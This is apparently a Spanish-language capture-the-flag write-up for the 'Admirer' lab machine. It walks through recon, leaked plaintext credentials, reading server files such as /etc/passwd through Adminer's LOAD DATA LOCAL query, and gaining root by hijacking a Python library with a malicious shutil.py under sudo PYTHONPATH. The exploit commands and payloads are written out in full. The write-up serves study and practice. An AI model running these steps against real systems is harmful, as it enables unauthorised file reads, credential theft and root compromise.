------
- Tags: #path-hijacking #library-hijacking #python3 #adminer #information-leakage #mysql
------
## Técnicas utilizadas
- Information Leakage  
- Admirer Exploitation (Abusing LOAD DATA LOCAL Query)
- Abusing Sudoers Privilege [Library Hijacking - Python] (Privilege Escalation)
## Procedimiento

![[Pasted image 20230720140513.png]]

-------
#### Reconocimiento
Si lanzamos un **nmap** contra la maquina, podemos ver los siguientes puertos abiertos:
```ruby
# nmap -sCV -p21,22,80 10.10.10.187 -oN Ports
Starting Nmap 7.93 ( https://nmap.org ) at 2023-07-21 10:35 MST
Nmap scan report for 10.10.10.187
Host is up (0.19s latency).

PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
22/tcp open  ssh     OpenSSH 7.4p1 Debian 10+deb9u7 (protocol 2.0)
| ssh-hostkey: 
|   2048 4a71e92163699dcbdd84021a2397e1b9 (RSA)
|   256 c595b6214d46a425557a873e19a8e702 (ECDSA)
|_  256 d02dddd05c42f87b315abe57c4a9a756 (ED25519)
80/tcp open  http    Apache httpd 2.4.25 ((Debian))
| http-robots.txt: 1 disallowed entry 
|_/admin-dir
|_http-title: Admirer
|_http-server-header: Apache/2.4.25 (Debian)
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 18.12 seconds
```

Un escaneo con **whatweb** nos muestra estas tecnologías web corriendo por detrás:
```ruby
# whatweb 10.10.10.187
http://10.10.10.187 [200 OK] Apache[2.4.25], Country[RESERVED][ZZ], HTML5, HTTPServer[Debian Linux][Apache/2.4.25 (Debian)], IP[10.10.10.187], JQuery, Script, Title[Admirer]
```

---------
#### Information Leakage  
Fuzzeando por directorios y archivos con herramientas como **Gobuster** y **Wfuzz** podemos llegar a dar con información sensible, esta corresponden a correos. Además, vemos que en los correos se filtra un posible  nombre de dominio:
```
##########
# admins #
##########
# Penny
Email: p.wise@admirer.htb


##############
# developers #
##############
# Rajesh
Email: r.nayyar@admirer.htb

# Amy
Email: a.bialik@admirer.htb

# Leonard
Email: l.galecki@admirer.htb



#############
# designers #
#############
# Howard
Email: h.helberg@admirer.htb

# Bernadette
Email: b.rauch@admirer.htb
```

Llama la atencion que haya descubierto un **.txt**, lo que podemos hacer es crear un diccionario apartir del **directory-list.2.3-medium.txt** para coger ciertas palabras que nos interesen:
```
# grep -iE "user|name|key|secret|cred|pass"
```

Ahora, si hacemos un escaneo denuevo sobre archivos, encontramos un archivo que parece contener potenciales credenciales:
```
[Internal mail account]
w.cooper@admirer.htb
fgJr6q#S\W:$P

[FTP account]
ftpuser
%n?4Wz}R$tTF7

[Wordpress account]
admin
w0rdpr3ss01!
```

Con credenciales para el servicio **FTP** intentaremos enumerar que recursos se estan compartiendo a nivel de red:
```
ftp> ls
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
-rw-r--r--    1 0        0            3405 Dec 02  2019 dump.sql
-rw-r--r--    1 0        0         5270987 Dec 03  2019 html.tar.gz
226 Directory send OK.
```

Descargamos el comprimido en nuestra maquina y observamos que basicamente es una versión antigua de lo que es ahora la pagina web. Dentro de la carpeta **Utility-Scripts** podemos encontrar un **PHPInfo** que es de gran utilizadad ya que nos dice que funciones podemos utilizar y cuales no:
![[Pasted image 20230721122952.png]]

Dentro de la carpeta también encontramos un archivo que contiene potenciales credenciales para conectarnos a una posible base de datos ( recordemos que **adminer** es un gestor de base de datos ). Como sabemos que adminer es un gestor de base de datos, podemos intuir que posiblemente exista el tipico archivo **adminer.php** asi que si lo colocamos en el buscador podremos visualizar el panel de inicio de sesión de **adminer**:
![[Pasted image 20230721123223.png]]

Las credenciales que encontramos antes son invalidas para iniciar sesión.

-----------
#### Admirer Exploitation (Abusing LOAD DATA LOCAL Query)
Buscando por vulnerabilidades para **adminer** encontramos una que nos permite leer información de la base de datos a partir de conectarnos a nuestra propia base de datos ( WTF ), este [articulo](https://www.foregenix.com/blog/serious-vulnerability-discovered-in-adminer-tool) lo explica más detalladamente.

Basicamente tenemos que crear una base de datos de manera local con nombre **adminerdb**:
```
mysql> create database adminerdb;
```

Ahora tenemos que crear un usuario con todos los privilegios existentes para si autenticarnos contra nuestra maquina:
```
mysql> create user 'sexcott'@'10.10.10.187' identified by 'sexcott';
mysql> GRANT ALL on adminerdb.* to 'sexcott'@'10.10.10.187';
```

Lo que haremos ahora es crear una tabla:
```
mysql> create table data(output varchar(1024));
```

En esta tabla se almacenara el **output** del archivo que deseemos leer de la maquina victima. Ahora simplemente en el apartado de **SQL command** tenemos que colocar la siguiente query:
```
load data local infile "/etc/passwd"
into table adminerdb.data
```

Cabe mencionar que no podemos leer todos los archivos de la maquina, dato que no tenemos permiso de lectura sobre algunos archivos tipicos. Si intentamos leer lo que hay en el **Index.php** del aplicativo web, nos damos cuenta que la contraseña para conectarse a la **Base de datos** es diferente a la que tenemos. Pues con estas credenciales podriamos conectarnos por **SSH** sin problemas:
```
$servername = "localhost";            
$username = "waldo";                  
$password = "&<h5b~yK3F#{PaPB&dA}{H>";
$dbname = "admirerdb";                
```

----------------
#### Abusing Sudoers Privilege [Library Hijacking - Python] (Privilege Escalation)
Dentro de la maquina vemos un script personalizado (el cual tenemos privilegios de sudoers para asignarle un path) . En este, hay una porcion de codigo que nos indica que se ejecuta un script de **python** si elegimos determinada opcion:
![[Pasted image 20230721130057.png]]

Si analizamos el codigo en python, nos percatamos que podriamos secuestrar una **Libreria** para ejecutar codigo arbitrario. Para acontecer esto, podemos modificar el **PATH** de **Python**:
```
# export PYTHONPATH="/tmp"
```

En **tmp** ahora crearemos un script en **Python** con nombre **shutil.py** para colocar el codigo que deseemos ejecutar:
```
import os
os.system("chmod u+s /bin/bash")
```

Nos queda solo modificar el **PATH** de **root** de la siguiente manera:
```
sudo PYTHONPATH=/tmp /opt/scripts/admin_task.sh
```

Lo ejecutamos y listando los privilegios de la **Bash** podemos ver que es **SUID** 

